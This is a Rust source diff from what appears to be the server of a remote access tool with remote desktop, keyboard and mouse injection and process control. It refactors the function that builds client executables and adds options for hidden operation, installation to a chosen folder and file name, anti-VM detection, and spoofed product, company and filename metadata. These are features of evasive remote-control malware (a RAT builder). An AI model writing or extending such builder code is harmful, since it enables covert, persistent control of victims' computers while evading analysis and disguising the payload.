@@ -2,7 +2,6 @@ use tauri::{State, Manager};
 use crate::handlers::{ SharedTauriState, AssemblyInfo };
 use crate::utils::logger::Log;
 use serde::Serialize;
-use std::vec;
 use std::fs;
 use base64::{engine::general_purpose, Engine as _};
 
@@ -21,11 +20,8 @@ use tauri::AppHandle;
 use once_cell::sync::OnceCell;
 
 use common::packets::{RemoteDesktopConfig, MouseClickData, KeyboardInputData, VisitWebsiteData, MessageBoxData, Process, ClientInfo};
+use crate::utils::client_builder::{apply_config, apply_rcedit, open_explorer};
 
-use object::{ Object, ObjectSection };
-use std::fs::File;
-use std::io::Write;
-use rmp_serde::Serializer;
 use std::process::Command;
 
 pub async fn get_channel_tx(tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<Sender<ServerCommand>, String> {
@@ -178,15 +174,16 @@ pub async fn build_client(
     assembly_info: AssemblyInfo,
     enable_icon: bool,
     icon_path: &str,
+    enable_install: bool,
+    install_folder: &str,
+    install_file_name: &str,
+    group: &str,
+    enable_hidden: bool,
+    anti_vm_detection: bool,
     app_handle: AppHandle
 ) -> Result<String, String> {
     let log = Log { event_type: "build_client".to_string(), message: "Building client...".to_string() };
     let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
-
-    let bin_data = fs::read("target/debug/client.exe").unwrap();
-    let file = object::File::parse(&*bin_data).unwrap();
-
-    let mut output_data = bin_data.clone();
 
     let config = common::ClientConfig {
         ip: ip.to_string(),
@@ -194,91 +191,29 @@ pub async fn build_client(
         mutex_enabled,
         mutex: mutex.to_string(),
         unattended_mode,
-        group: "Default".to_string(),
-        install: false,
-        file_name: "".to_string(),
-        install_folder: "".to_string(),
-        enable_hidden: false,
-        anti_vm_detection: false,
+        group: group.to_string(),
+        install: enable_install,
+        file_name: install_file_name.to_string(),
+        install_folder: install_folder.to_string(),
+        enable_hidden,
+        anti_vm_detection,
     };
 
-    let mut buffer: Vec<u8> = Vec::new();
-
-    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();
-
-    let mut new_data = vec![0u8; 1024];
-
-    for (i, byte) in buffer.iter().enumerate() {
-        new_data[i] = *byte;
-    }
-
-    if let Some(section) = file.section_by_name(".zzz") {
-        let offset = section.file_range().unwrap().0 as usize;
-        let size = section.size() as usize;
-
-        output_data[offset..offset + size].copy_from_slice(&new_data);
-    }
-
-    let mut file = File::create("target/debug/Client_built.exe").unwrap();
-    let _ = file.write_all(&output_data);
-    drop(file);
-
-    let mut cmd = Command::new("target/rcedit.exe");
-
-    cmd.arg("target/debug/Client_built.exe");
-
-    if enable_icon && icon_path != "" {
-        cmd.arg("--set-icon").arg(icon_path);
-    }
-
-    if assembly_info.assembly_name != "" {
-        cmd.arg("--set-version-string").arg("ProductName").arg(&assembly_info.assembly_name);
-    }
-
-    if assembly_info.assembly_description != "" {
-        cmd.arg("--set-version-string").arg("FileDescription").arg(&assembly_info.assembly_description);
-    }
-
-    if assembly_info.assembly_company != "" {
-        cmd.arg("--set-version-string").arg("CompanyName").arg(&assembly_info.assembly_company);
-    }
+    apply_config(&config).await?;
     
-    if assembly_info.assembly_copyright != "" {
-        cmd.arg("--set-version-string").arg("LegalCopyright").arg(&assembly_info.assembly_copyright);
+    match apply_rcedit(&assembly_info, enable_icon, icon_path).await {
+        Ok(_) => {
+            let log = Log { event_type: "build_finished".to_string(), message: "Client built successfully.".to_string() };
+            let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+        }
+        Err(e) => {
+            let log = Log { event_type: "build_failed".to_string(), message: "Failed to build client.".to_string() };
+            let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+            return Err(e.to_string());
+        }
     }
 
-    if assembly_info.assembly_trademarks != "" {
-        cmd.arg("--set-version-string").arg("LegalTrademarks").arg(&assembly_info.assembly_trademarks);
-    }
-
-    if assembly_info.assembly_original_filename != "" {
-        cmd.arg("--set-version-string").arg("OriginalFilename").arg(&assembly_info.assembly_original_filename);
-    }
-
-    if assembly_info.assembly_file_version != "" {
-        cmd.arg("--set-file-version").arg(&assembly_info.assembly_file_version);
-    }
-
-    let status = cmd.status().unwrap();
-
-    if !status.success() {
-        let log = Log { event_type: "build_failed".to_string(), message: "Failed to build client.".to_string() };
-        let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
-    }
-    
-    let log = Log { event_type: "build_finished".to_string(), message: "Client built successfully.".to_string() };
-    let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
-
-    let written_file_path = std::fs::canonicalize("target/debug/Client_built.exe")
-    .map_err(|e| format!("Failed to get full path: {}", e))?
-    .to_string_lossy()
-    .replace(r"\\?\", "");
-
-    let _ = Command::new("explorer")
-    .arg("/select,")
-    .arg(&written_file_path)
-    .status()
-    .map_err(|e| println!("Failed to open explorer: {}", e));
+    open_explorer("target/debug/Client_built.exe").await?;
 
     Ok("Client built".to_string())
 }
